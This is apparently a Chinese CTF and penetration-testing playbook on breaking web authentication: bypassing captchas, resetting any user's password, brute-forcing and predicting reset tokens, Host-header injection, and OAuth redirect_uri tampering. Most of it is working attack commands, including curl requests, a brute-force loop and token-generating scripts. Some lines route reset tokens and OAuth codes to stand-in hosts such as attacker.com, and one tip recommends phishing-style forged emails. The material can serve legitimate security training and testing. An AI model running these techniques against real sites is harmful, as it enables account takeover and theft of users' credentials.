## [g4] 验证码——验证码四道防线：可 OCR、可复用、可回显、前端假校验。
### [captcha-ocr] 验证码识别与复用 | easy | 验证码;OCR | 验证码复用
> 简单验证码 OCR、验证码复用、万能验证码与删除参数绕过。
#### 这个条目的作用
图形验证码是登录/找回密码接口最常见的一道闸。这个条目解决三件事：验证码太简单可以机器识别（OCR）、验证码发一次能反复用（复用）、以及后端根本不校验（删参数/万能码直接绕过）。CTF 里多数验证码题根本不用真识别，先测「它到底管不管用」，再决定要不要上 OCR。
#### 前置条件
- 能抓到登录/校验接口的完整请求包（Burp Suite 或浏览器 F12）
- 本地装了 tesseract（`tesseract --version` 验证），或能访问打码平台
- 一个能重复发送请求的工具（curl 或 Burp Repeater）
#### 第 1 步：判断验证码是否真的参与服务端判定
拿到图形验证码的请求流程后，先做三个最低成本的测试，任何一个成立就直接绕过了：
```bash
# 测试 1：删除 code 参数
curl -X POST http://t/login -d 'user=admin&pass=123456'
# 测试 2：code 置空
curl -X POST http://t/login -d 'user=admin&pass=123456&code='
# 测试 3：固定一个错误码
curl -X POST http://t/login -d 'user=admin&pass=123456&code=0000'
```
预期结果：如果这三类请求里有一个返回了「登录成功/下一步」而不是「验证码错误」，说明后端根本没把验证码纳入判定，后面所有步骤都可以跳过。
如果不行：说明验证码参与判定，继续第 2 步。
#### 第 2 步：测试验证码复用
有些实现验证码只在「生成时」与「会话」绑定，校验成功一次后不销毁，或者校验动作与登录动作分离。测试方法：
```bash
# 1. 正常打开登录页，拿到验证码图片和对应 cookie（记录 code 的值，例如 4821）
curl -c cap.txt http://t/captcha > captcha.png
# 2. 用这个 code 登录一次（成功或失败都记录）
curl -b cap.txt -X POST http://t/login -d 'user=admin&pass=admin&code=4821'
# 3. 重新发起登录（同一 cookie、同一 code），看是否仍提示成功
curl -b cap.txt -X POST http://t/login -d 'user=admin&pass=admin&code=4821'
```
预期结果：同一验证码在第二次请求里仍然通过，说明验证码不消费、可复用，抓一次图即可无限爆破。
#### 第 3 步：万能验证码与弱比较
一些实现把「校验通过」写成固定值比较，或者用弱等值比较（`==`），测试这些值：
```txt
0000 / 000000 / 1234 / 123456 / 8888 / 9999
空字符串 '' / 字符串 'null' / 字符串 'false' / 数字 0
```
> [!tip] 弱等值比较（`==`）下 `code=0` 可能匹配任意非数字内容，`code=false` 可能匹配空值，这两种在 PHP 题里出现频率很高。
#### 第 4 步：真的需要识别时——tesseract OCR
确认验证码参与判定且不复用，才上 OCR。先看验证码类型：纯数字、纯字母、数字+字母、是否带干扰线/噪点。
```bash
# 下载验证码图片后用 tesseract 识别（psm 7 = 单行文本，digits = 只认数字）
tesseract captcha.png out -psm 7 digits
cat out.txt
# 字母数字混合：去掉 digits 限制
tesseract captcha.png out -psm 7
```
预期结果：out.txt 里出现正确结果。如果识别率低，预处理一下：放大、转灰度、二值化、去干扰线（ImageMagick）：
```bash
convert captcha.png -resize 400% -colorspace Gray -threshold 60% clean.png
tesseract clean.png out -psm 7 digits
```
#### 第 5 步：识别不出来时的降级方案
- 打码平台：把图片 POST 给平台 API，返回识别结果，适合比赛里快速迭代
- 本地 CNN 模型：训练集够多时对「扭曲但不加噪」的码很有效，但 CTF 里一般用不上
- 换思路：验证码图片 URL 带 session 或文件名时，检查响应头/文件名是否回显答案（见 captcha-frontend 条目）
> [!warn] 一个验证码能识别就抓 100 张批量识别存成字典再爆破，不要每张现识别——OCR 有延迟且会漏。
#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| OCR 结果全是乱码 | 有干扰线/噪点，psm 模式不对 | 预处理（放大/二值化）+ 换 psm 7 试 |
| 删参数后仍报「验证码错误」 | 后端确实校验 | 转测试复用与万能码 |
| 复用失败 | 验证码校验后销毁（一次性） | 走 OCR 路线或找校验接口与业务接口分离 |
| 爆破被限速 | 有 IP/次数限制 | 换 X-Forwarded-For、加随机参数（见 sms-bruteforce 条目） |
| 图片 URL 相同但每次内容不同 | 验证码按会话绑定 | 必须带登录页的 cookie 一起请求图片与提交 |
#### 实战要点
- 测试顺序永远从低到高：删参数 → 置空 → 固定值 → 复用 → 万能码 → OCR，多数弱实现在前两步就倒了
- 验证码图片与校验请求必须共用同一会话（cookie），否则永远报错，误判为「验证码有效」
- 比赛时间紧张时，先抓 3-5 张图人工看一遍特征再决定是否值得搭 OCR
- 把 code 参数换成 JSON 字段（`"code":null`）或数组（`code[]=1`）有时能触发类型绕过
- 打码平台优先于本地 tesseract：识别率高、延迟可控，适合爆破循环
## [g5] 密码重置——密码重置是认证逻辑最高发漏洞区：任意用户重置、Host 头注入、token 可爆破。
### [reset-arbitrary] 任意用户重置 | medium | 密码重置;越权 | 任意重置
> 重置可指定任意用户、步骤可跳过、验证弱化导致任意账号接管。
#### 这个条目的作用
密码重置的本质是「证明你是账号主人」+「设置新密码」两步。任意用户重置就是这两步里至少一步可以被绕过或篡改：要么身份验证能跳过/弱化，要么目标用户参数可控。打下来就是任意账号接管，是认证题里的高分洞。
#### 前置条件
- 有一个自己的测试账号，能完整走一遍正常重置流程并抓包
- Burp Suite（Proxy 抓包 + Repeater 改包重放）
- 目标账号（如 admin）的基本信息：用户名/手机号/邮箱至少知道一个
#### 第 1 步：完整走一遍正常重置流程并抓全请求
用自己账号走：输入手机/邮箱 → 收验证码 → 填验证码 → 设置新密码 → 完成。期间 Burp 全程开抓，按顺序记录每个请求：
```txt
请求 A: POST /forgot          {"phone":"13800138000"}
请求 B: POST /verify_code     {"phone":"13800138000","code":"4821"}
请求 C: POST /reset_password  {"phone":"13800138000","newpass":"hack123"}
```
预期结果：拿到 3-5 个接口的完整参数结构。重点观察：哪个参数标识「当前用户」（phone / user / tel / uid / email / account），哪个参数标识「步骤」（step / stage / type）。
#### 第 2 步：篡改用户标识参数，重置他人账号
把每个请求里的用户标识改成目标账号，逐层测试：
```bash
# 篡改用户参数为目标账号
curl -X POST http://t/forgot \
  -H 'Content-Type: application/json' \
  -d '{"phone":"<目标手机号>"}'          # phone 换成目标
curl -X POST http://t/verify_code \
  -d '{"phone":"<目标手机号>","code":"4821"}'   # 用自己的验证码
curl -X POST http://t/reset_password \
  -d '{"phone":"<目标手机号>","newpass":"hacked123"}'
```
预期结果：如果 verify_code 里手机号换成目标、验证码还是自己账号的，却校验通过，说明验证码没和手机号绑定——直接接管目标。
如果不行：验证码绑定用户，继续第 3 步。
#### 第 3 步：跳过验证步骤，直调设置新密码接口
重置流程各步骤常常是独立的接口，后端未必校验「是否走完了上一步」。直接绕过验证码接口，把最后一步单独发出去：
```bash
# 不经过 /verify_code，直接调设置新密码接口
curl -X POST http://t/reset_password \
  -d '{"phone":"<目标手机号>","newpass":"hacked123"}'
# 带步骤参数的：把 step 跳到最后一环
curl -X POST http://t/forgot -d 'step=3&user=admin&newpass=hacked123'
```
预期结果：返回成功且目标账号能用新密码登录，说明步骤状态机没被服务端校验。
#### 第 4 步：验证方式降级
有些系统支持多种验证通道（短信/邮箱/安全问题），不同通道的校验强度不同：
```txt
1. 发起重置时选邮箱通道（可能不校验邮箱归属，或邮箱可改）
2. 选安全问题通道（问题固定、答案常见，如 "你的名字是？" -> admin）
3. 比较各通道：短信通道要真码，安全问题通道可能只是弱校验
```
预期结果：选到弱通道后，用常见答案或直接空提交通过验证，随后进设置新密码步骤，同样把用户参数改成目标。
#### 第 5 步：观察验证码/新密码是否回显
重置接口把「校验码」「新密码」「重置 token」直接回显在响应体时属于直接泄露：
```txt
POST /forgot 响应: {"msg":"验证码已发送","code":"4821"}   <- 验证码回显
POST /reset_password 响应: {"newpass":"hacked123"}        <- 新密码回显
```
预期结果：响应里出现上述字段，直接读取使用即可，连目标交互都不需要。
#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 换目标手机号后验证码报错 | 验证码与手机号绑定 | 走跳过步骤/降级通道路线 |
| 直调 reset_password 返回 401/未授权 | 有 session 或临时凭证校验 | 先调 verify_code 拿凭证再带 cookie 重放 |
| 步骤参数改了没反应 | 后端按固定顺序路由 | 逐个接口乱序重放，观察报错差异 |
| 接口返回「用户不存在」 | 目标账号不存在或参数名不对 | 换参数名（uid/account/tel）重试 |
| 重置成功但登录失败 | 新密码走了二次哈希/需要邮箱激活 | 检查响应里的其他字段（active/token） |
#### 实战要点
- 永远先用自己的账号把全流程请求抓全，再逐接口、逐参数地做替换测试，别凭空猜接口
- 用户标识参数可能出现在 URL、JSON、表单、甚至 Cookie（`uid=1`）里，全都要试
- 改目标时优先试 admin / root / 第一个注册用户，这几个账号最有价值
- 步骤跳级要试「正向跳」（step=3）也要试「反向乱序」（先调第 3 步再调第 1 步）
- 重置成功后检查旧密码是否仍可登录（新旧并存），这也算缺陷，别急着收工
### [reset-token] 重置 token 爆破与泄露 | medium | 密码重置;Token | 重置链接
> 重置链接 token 可预测/可爆破、过期机制缺陷与泄露面。
#### 这个条目的作用
很多系统不发验证码，而是发一条带 token 的重置链接（`/reset?token=xxx`）。只要 token 的生成方式可预测（时间戳、用户名、弱随机、短数字）或可枚举（4-6 位数字），就能伪造/爆破出目标账号的重置链接，拿到链接即等于拿到重置权。
#### 前置条件
- 自己的账号能触发重置并收到重置链接，能抓包看链接内容
- Python3（生成候选 token）与 curl（批量请求）
- 目标账号名（admin 之类）与触发重置的接口
#### 第 1 步：观察 token 形态，判断生成规律
用自己账号触发重置，抓链接，把 token 复制出来观察：
```txt
常见形态
- 纯数字 4-6 位：  /reset?token=4821            -> 直接爆破
- MD5/SHA1 32/40 位：/reset?token=5f4dcc3b5aa765d61d8327deb882cf99  -> 试常见明文
- UUID:            /reset?token=550e8400-e29b-41d4-a716-446655440000  -> 看版本，v1 含时间
- 时间戳+随机:       /reset?token=1699999999_4821 -> 试时间戳枚举
```
预期结果：确定 token 是「纯数字」「哈希」「UUID」「拼接」中的哪一类，决定后面走爆破还是推导。
#### 第 2 步：短数字 token 直接爆破
4-6 位纯数字的 token 空间极小（1 万到 100 万个），配合验证码接口通常没有频率限制：
```bash
# 4 位 token 爆破（先确认重置链接校验接口）
for i in $(seq 0 9999); do
  code=$(printf '%04d' $i)
  resp=$(curl -s "http://t/reset?token=$code" -o /dev/null -w '%{http_code}')
  # 或根据响应内容判断：curl -s "http://t/reset?token=$code" | grep -q '设置新密码'
  [ "$resp" != "404" ] && echo "HIT:$code" && break
done
```
预期结果：循环内命中「非错误页」的 token。命中后直接打开该链接完成重置。
如果不行：接口有次数限制或 token 是长串，转第 3 步。
#### 第 3 步：可预测 token 推导
token 由已知信息哈希/拼接而成时，直接本地生成候选：
```bash
# MD5(用户名)
python3 -c 'import hashlib;print(hashlib.md5(b"admin").hexdigest())'
# MD5(时间戳) 附近窗口：取触发重置前后各 10 分钟逐秒生成
python3 - <<'EOF'
import hashlib, time
now = int(time.time())
for ts in range(now-600, now+600):
    print(hashlib.md5(str(ts).encode()).hexdigest())
EOF
# 用户名+时间戳拼接
python3 -c 'import hashlib,time;print(hashlib.md5(b"admin"+str(int(time.time())).encode()).hexdigest())'
```
预期结果：生成的某个候选 token 访问重置链接返回正常重置页。把候选列表存成文件后脚本批量请求验证。
#### 第 4 步：token 泄露面排查
token 可能不止出现在邮件里，翻遍这些地方：
```txt
1. 响应体回显：POST /forgot 的响应 JSON 里直接带 token
2. 响应头：Set-Cookie / X-Reset-Token 等自定义头
3. Referer：重置页里引用的静态资源会把链接带进 Referer
4. 访问日志 / 调试接口：/logs /debug 之类
5. 前端 JS：重置链接模板或 token 生成逻辑写在 JS 里
```
> [!tip] 先看 POST /forgot 的完整响应，再换 Referer 和调试接口，回显型 token 是最省事的。
#### 第 5 步：过期机制与复用缺陷
测试 token 的生命周期管理：
```txt
1. 用 token 完成一次重置后，再次访问该链接 -> 是否仍有效（应失效）
2. 等待超过声称的过期时间（5 分钟/1 小时）再访问 -> 是否仍有效
3. 触发两次重置，看两次 token 是否相同（不轮换 = 可一直复用）
4. 重置后旧密码是否还能登录（新旧并存）
```
预期结果：任一「应失效却仍有效」成立，即可反复利用或跨时间利用同一链接。
#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 爆破全是 404 | 重置链接接口路径不对或校验在 POST 里 | 抓包确认校验接口方法与参数 |
| 爆破被限速/封 IP | 有频率限制 | 换 IP 头、加随机参数、拉长间隔（见 sms-bruteforce 条目） |
| MD5 猜不出 | 明文不是纯用户名/时间戳 | 试 user+phone、user+secret 拼接，或看前端 JS 找生成逻辑 |
| token 看起来是 UUID v4 | 真随机，爆破不可行 | 转找泄露面（响应/日志/调试接口） |
| 链接访问返回登录页 | token 校验与 session 绑定 | 带上触发重置时的 cookie 再访问 |
#### 实战要点
- 先花 30 秒观察 token 形态再动手：纯数字直接爆，哈希先试常见明文，别盲目上字典
- 时间戳类 token 的窗口以「触发重置的那一刻」为中心，前后扩几分钟生成候选
- 两个 token 对比测试：连续触发两次重置，token 是否变化是最快的可预测性判断
- token 回显优先查 POST /forgot 的响应体，这是最高频的泄露点
- 爆破脚本要按响应内容（而非仅状态码）判断命中，避免撞上统一 200 的实现
### [reset-hostheader] Host 头注入与接口越权 | medium | 密码重置;Host头 | host头注入
> Host 头注入制造重置链接、接口越权重置、密码修改逻辑缺陷。
#### 这个条目的作用
重置邮件里的链接（`http://<域名>/reset?token=xxx`）的域名部分常常取自请求的 Host 头。Host 头可控时，把域名改成攻击者服务器，受害者点开邮件里的链接，token 就会带着真实值请求到攻击者域名——攻击者从自己服务器的日志里拿到 token，直接完成重置。附带讲改密接口的越权与逻辑缺陷。
#### 前置条件
- 一个公网可达、能记录请求日志的服务器（VPS 或类似），用于接收受害者的回调
- Burp Suite 修改 Host 头与相关头
- 目标的重置接口（POST /forgot 之类）与目标账号名
#### 第 1 步：确认链接域名来自请求头
用自己账号触发重置，正常流程收邮件，看链接域名。然后把 Host 头改成一个自己控制的域名再触发一次：
```bash
# 正常触发
curl -X POST http://t/forgot -d 'user=admin'
# 修改 Host 头触发
curl http://t/forgot -H 'Host: attacker.com' -d 'user=admin'
```
预期结果：第二次收到的邮件里链接变成 `http://attacker.com/reset?token=xxx`，说明域名取自 Host 头，注入成立。
如果不行：域名写死，逐个试下面的替代头（实现取头的优先级各不相同）：
```bash
curl http://t/forgot -H 'X-Forwarded-Host: attacker.com' -d 'user=admin'
curl http://t/forgot -H 'X-Real-Host: attacker.com' -d 'user=admin'
curl http://t/forgot -H 'X-Forwarded-For: attacker.com' -d 'user=admin'
curl http://t/forgot -H 'X-Host: attacker.com' -d 'user=admin'
# 绝对 URL 覆盖：把 URL 写成攻击者域名，Host 保持原样
curl https://attacker.com/forgot -H 'Host: t.com' -d 'user=admin'
```
> [!danger] 拼链接的优先级因实现而异 (Host / X-Forwarded-Host / X-Real-Host), 逐个替换头测试。
#### 第 2 步：攻击者服务器接收 token
在 VPS 上起一个最小 HTTP 服务并观察日志：
```bash
# 任意目录执行，监听 80 端口，记录所有请求
python3 -m http.server 80
# 或更省资源：nc 监听
nc -lvnp 80
```
预期结果：受害者点击邮件链接后，服务日志里出现 `GET /reset?token=xxxx` 一行，token 到手。
#### 第 3 步：用 token 完成重置
拿到 token 后直接访问真实域名的重置链接：
```bash
curl -s "http://t/reset?token=<窃取到的token>" -d 'newpass=hacked123'
```
预期结果：重置成功，用新密码登录目标账号。注意部分实现会校验 token 里的域名，需要保持与原始链接一致的路径结构。
#### 第 4 步：改密接口越权与逻辑缺陷
重置之外，直接改密码的接口（/change_pwd / /api/change_password）常常更糙：
```bash
# 1. 不带旧密码直接改
curl -X POST http://t/change_pwd -d 'newpass=hacked123'
# 2. old_password 参数存在但不参与校验
curl -X POST http://t/change_pwd -d 'old_password=whatever&newpass=hacked123'
# 3. user 参数可控 -> 越权改他人密码
curl -X POST http://t/change_pwd -d 'user=admin&newpass=hacked123'
```
预期结果：任一请求返回成功，且对应账号（或他人账号）密码被改掉。
#### 第 5 步：改密后的会话清理检查
改密成功的实现还应使旧凭证失效，逐个验证：
```txt
1. 改密前登录的旧 session 是否仍可用
2. 之前发出的重置 token 是否仍有效
3. 原密码是否还能登录（新旧并存）
```
预期结果：以上任一「仍有效」都算缺陷——旧会话/旧 token/旧密码未随改密失效，可继续利用。
#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 改 Host 后请求 400/403 | 后端白名单校验 Host | 试 X-Forwarded-Host 系列头，或绝对 URL 覆盖 |
| 邮件链接域名没变 | 域名写死或取自配置 | 检查是否还有 X-Forwarded-For / X-Real-IP 参与 |
| 收到回调但没 token | 受害者的链接访问了攻击者域但带参数不全 | 检查日志完整 URL，确认 token 在 query 里 |
| token 换到真实域名无效 | token 绑定了原始域名 | 保持路径、参数完全一致，必要时带 Referer |
| 改密接口返回 401 | 接口要求登录态 | 先用自己账号登录拿 session 再改包测试越权 |
#### 实战要点
- 先用自己的账号 + 自己的 VPS 验证整条链（触发 → 收链接 → 收到 token），链路通了再打真实目标
- Host 头注入的成功标志是「邮件链接里的域名变成你的域名」，而不是请求本身报不报错
- 没有公网 VPS 时，用 Burp Collaborator 或 dnslog 也能确认请求是否外发
- 改密越权测试里，`user` 参数改名要同时试表单字段和 JSON 字段两种形态
- 重置邮件点击发生在受害者侧，实战中配合社工（伪造官方邮件标题）提高点击率
## [g6] OAuth2 与 SSO——OAuth 四件套：redirect_uri、state、code、token 挨个验；SAML 断言签名优先。
### [oauth-redirect] OAuth redirect_uri 篡改 | medium | OAuth;SSO | oauth回调
> redirect_uri 校验缺陷导致授权码/令牌窃取与账号接管。
#### 这个条目的作用
OAuth2 授权码流程里，用户同意授权后，授权服务器会把 code 通过浏览器跳转到 redirect_uri 指定的地址。redirect_uri 校验不严时，攻击者构造一个指向自己域名的授权 URL 诱导受害者点击，受害者完成授权后 code 落到攻击者手里，攻击者拿 code 换 token，就接管了受害者在第三方应用的账号。
#### 前置条件
- 理解授权码流程的基本角色：资源所有者（受害者）、客户端应用（第三方网站）、授权服务器（如 GitHub/微信/自建 OAuth）
- 一个能收到 code 回调的地址（自己的服务器或 Burp Collaborator）
- 浏览器能访问目标应用的「使用 XX 登录」入口，并全程抓包
#### 第 1 步：抓取正常授权 URL 并拆解参数
点击「使用 XX 登录」，在 Burp 里找到跳转授权服务器的请求，复制授权 URL：
```txt
https://auth-server.com/oauth/authorize?
  response_type=code&
  client_id=app123&
  redirect_uri=https://target.com/callback&
  scope=read&
  state=abc123
```
预期结果：确认 redirect_uri 的完整值与白名单归属（必须是 target.com 域下的合法回调）。
#### 第 2 步：篡改 redirect_uri，逐变体测试
把授权 URL 里的 redirect_uri 换成攻击者地址，用浏览器/curl 直接访问测试授权服务器是否放行：
```txt
直接换成攻击者域名:
  redirect_uri=https://attacker.com/cb

域名相似混淆（@ 之前的部分被浏览器忽略为用户名）:
  redirect_uri=https://target.com@attacker.com

子域宽松（白名单做包含匹配时）:
  redirect_uri=https://target.com.evil.com

路径穿越（白名单做前缀匹配时）:
  redirect_uri=https://target.com/cb/../../attacker

参数注入（回调内部再做一次跳转）:
  redirect_uri=https://target.com/cb?redirect=https://attacker.com

去掉 redirect_uri 参数 / 写成多个同名参数:
  redirect_uri=https://attacker.com/cb&redirect_uri=https://target.com/cb
```
预期结果：某个变体让授权服务器正常返回「同意授权」页面（而不是「redirect_uri 不合法」错误），说明校验可绕过。
如果不行：把授权 URL 里 redirect_uri 改成非法值，观察错误提示——有些实现会回显「合法格式应为 xxx」，直接抄格式再变体。
#### 第 3 步：诱导受害者完成授权
把篡改后的授权 URL 发给受害者（或在自己浏览器模拟受害者点击）：
```txt
1. 访问篡改后的授权 URL
2. 到达同意页，确认 redirect_uri 已被渲染成攻击者域名（部分页面会明文显示）
3. 点击「同意/授权」
4. 浏览器跳转到: https://attacker.com/cb?code=AUTH_CODE_XXX&state=abc123
```
预期结果：攻击者服务器日志收到带 code 的回调请求，code 到手。
#### 第 4 步：用窃取的 code 换取 token
code 换 token 需要 client_secret（客户端密钥）。拿到 code 后按正常换 token 请求打：
```bash
curl -X POST https://auth-server.com/oauth/token \
  -d 'grant_type=authorization_code' \
  -d 'code=<窃取的code>' \
  -d 'redirect_uri=https://attacker.com/cb' \
  -d 'client_id=app123' \
  -d 'client_secret=<泄露或已知的密钥>'
```
预期结果：返回 access_token + refresh_token。如果 client_secret 拿不到（不泄露），看第 5 步。
#### 第 5 步：无 secret 时的降级利用
- **public client（无 secret 类型）**：部分授权服务器允许不传 secret 直接换 token，直接重放即可
- **code 重用**：code 单次有效是标准要求，测试换过一次后再换是否仍有效（不消耗 = 缺陷）
- **code 换 token 时不校验 redirect_uri**：换 token 请求里的 redirect_uri 可与授权时的不同，照常换
- **implicit 模式**：`response_type=token` 时 access_token 直接经 URL fragment 回传，中间页面可拦截 fragment，不需要 secret
```bash
# 无 secret 直接换
curl -X POST https://auth-server.com/oauth/token \
  -d 'grant_type=authorization_code&code=<code>&redirect_uri=https://attacker.com/cb&client_id=app123'
# implicit 模式：token 在 fragment，用 token 直接调 API
curl -H 'Authorization: Bearer <access_token>' http://target.com/api/userinfo
```
#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 改 redirect_uri 直接报「不合法」 | 白名单严格校验 | 试子域/路径穿越/@/参数注入变体，或看错误回显的合法格式 |
| 同意页正常但回调没到攻击者服务器 | 校验在同意页之后又做了一次 | 抓包看最终跳转，比对两次校验差异 |
| 拿到 code 换 token 报错 | 缺 client_secret 或 redirect_uri 不匹配 | 试无 secret 换、改 redirect_uri 为攻击者域名重放 |
| code 用一次就失效 | 单次性正确实现 | 换 token 后立刻用，别反复测试耗尽 code |
| 授权 URL 无 state | state 缺失可另做 CSRF 登录 | 参考 oauth-state 条目串联利用 |
#### 实战要点
- 授权流程每跳都抓包：授权 URL 构造 → 同意页 → 回调，redirect_uri 的最终值以同意页渲染/回调为准
- 白名单绕过按「前缀匹配 → 包含匹配 → 子域宽松 → 解析差异」顺序逐一测，每种至少 4-5 个变体
- 解析差异（@ 符号、URL 编码、大小写、尾斜杠）经常是校验器与浏览器解析不一致导致的
- client_secret 不泄露时优先试 public client 无 secret 换 token，其次 implicit 模式
- 漏洞定级看影响：能换 token = 任意账号接管；只拿到 code 但换不了 token = 信息泄露/登录 CSRF
